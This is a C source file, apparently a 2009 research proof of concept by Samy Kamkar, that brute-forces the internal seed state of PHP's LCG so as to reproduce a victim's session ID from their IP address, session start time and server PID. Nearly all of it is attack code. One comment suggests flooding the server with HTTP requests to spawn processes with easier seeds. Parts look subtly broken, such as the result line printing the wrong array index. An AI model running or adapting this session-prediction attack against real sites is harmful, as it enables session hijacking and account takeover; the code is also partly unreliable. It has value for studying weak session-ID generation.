/*
 * To compile: gcc -std=c99 -lm -lcrypto time-session.c -o time-session
 *
 * This program will take way too long to help you. Consider
 * an FPGA implementation of this program to run in a (possibly)
 * reasonable amount of time.
 *
 * Given a session ID, IP and the time the session was created,
 * it attemps to find s1 and s2 (internal state of PHP's LCG).
 *
 * It brute forces s1 and s2 (down from 64 bits to 35), but also
 * brute forces sessions, which is another 20 bits.
 *
 * By getting the PID the session was created in, you can increase
 * the speed by 31,744 times. This still won't help you!
 *
 * However, if you get an lcg_value(), THEN you have something to
 * work off of. A PID and lcg_value() will retrieve the s1 and s2
 * in a matter of seconds (see s1s2.c). With just a PID, this
 * takes 2**21 seconds per round on an MBP.
 *
 * Good luck.
 *
 * -samy kamkar, code@samy.pl, 08/22/09
 */

// time ./time-session 72.37.252.206 1251248690 5 91cde0gh3jk4mn5pq6s7u8

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <math.h>
#include <sys/time.h>
#include <openssl/md5.h>

/*
 * combinedLCG() returns a pseudo random number in the range of (0, 1).
 * The function combines two CGs with periods of
 * 2^31 - 85 and 2^31 - 249. The period of this function
 * is equal to the product of both primes.
 */

int q, z;
#define MODMULT(a, b, c, m, s) q = s/a;s=b*(s-a*q)-c*q;if(s<0)s+=m

double combined_lcg(int s1, int s2)
{
	z = s1 - s2;
	if (z < 1) {
		z += 2147483562;
	}

	return z * 4.656613e-10;
}

static char *pt(unsigned char *md)
{
	int i;
	static char buf[80];

	for (i = 0; i < MD5_DIGEST_LENGTH; i++)
		sprintf(&(buf[i*2]), "%02x", md[i]);

	return(buf);
}


static char hexconvtab[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,-";
static char *bin_to_readable(char *in, size_t inlen, char *out, char nbits)
{
	unsigned char *p, *q;
	unsigned short w;
	int mask;
	int have;

	p = (unsigned char *) in;
	q = (unsigned char *)in + inlen;

	w = 0;
	have = 0;
	mask = (1 << nbits) - 1;

	while (1) {
		if (have < nbits) {
			if (p < q) {
				w |= *p++ << have;
				have += 8;
			} else {
				/* consumed everything? */
				if (have == 0) break;
				/* No? We need a final round */
				have = nbits;
			}
		}

		/* consume nbits */
		*out++ = hexconvtab[w & mask];
		w >>= nbits;
		have -= nbits;
	}

	*out = '\0';
	return out;
}

int main(int argc, char** argv)
{
	char buf[512];
	unsigned char *md = malloc(18);
	char *p = malloc(34);

	if (argc != 6)
	{
		fprintf(stderr, "usage: %s <ip> <pid/s2 [or 0]> <session start time> <bits per session byte [4|5|6]> <session id>\n", argv[0]);
		return -1;
	}

	double stime = strtod(argv[3], NULL);
	int bits = atoi(argv[4]);
	int i, j, k, l, usec;
	int s1array[1000001]; // it's called a time-memory tradeoff. don't complain.
	int s2, origs2, exp216, start_j;
	double lcg;
	origs2 = s2 = atoi(argv[2]);
	if (s2)
	{
		start_j = s2;
		exp216 = s2 + 1;
	}
	else
	{
		exp216 = exp2(15);
		start_j = 1024;
	}
	int s2array[exp216+1];
	

	/* get our time, we'll brute force 20 bits of this */
    struct timeval tv;
	gettimeofday(&tv, NULL);

	/* Number of rounds to test
	 * if it takes too long, i would send lots of http requests 
 	 * to the server until a new process spawns, thus producing
 	 * new seeds easier to produce */
	for (k = 1; k < 10000; k++)
	{
		printf("Testing for %d round of lcg_value()...\n", k);

		/* brute force 20 bits of s1 */
		for (i = 0; i < 1000000; i++)
		{
			printf("Testing s1 bit %d...\n", i);
			if (k == 1)
				s1array[i] = tv.tv_sec ^ (~i);
			MODMULT(53668, 40014, 12211, 2147483563L, s1array[i]);

			/* brute force s2 PID (2 ** 15) if necessary */
			for (j = start_j; j < exp216; j++)
			{
				printf("Testing s2 %d...\n", j);
				/* modmult only once per round */
				if (i == 0)
				{
					/* on our first s1, set initial value */
					if (k == 1)
						s2array[j] = j;
					MODMULT(52774, 40692, 3791, 2147483399L, s2array[j]);
				}

				/* save our lcg during session brute force */
				lcg = combined_lcg(s1array[i], s2array[j]) * 10;

				/* brute force usec from session */
				for (usec = 0; usec < 1000000; usec++)
				{
					sprintf(buf, "%.15s%ld%ld%0.8F", argv[1], (long int)stime, (long int)usec, lcg);
					MD5((unsigned char *)buf, strlen(buf), md);
					bin_to_readable((char *)md, MD5_DIGEST_LENGTH, p, bits);
					//p = pt(md);
					if (strcmp(argv[5], p) == 0)
					{
						printf("FOUND: p=%s buf=%s\ns1=%d s2=%d origs1=%d origs2=%d sess_usec=%d s2-j=%d s1-i=%d round=%d\n",
							p, buf, s1array[j], s2array[j], tv.tv_sec ^ (~i), j, usec, j, i, k);
						return 0;
					}
				}
			}
		}
	}

	return 0;
}

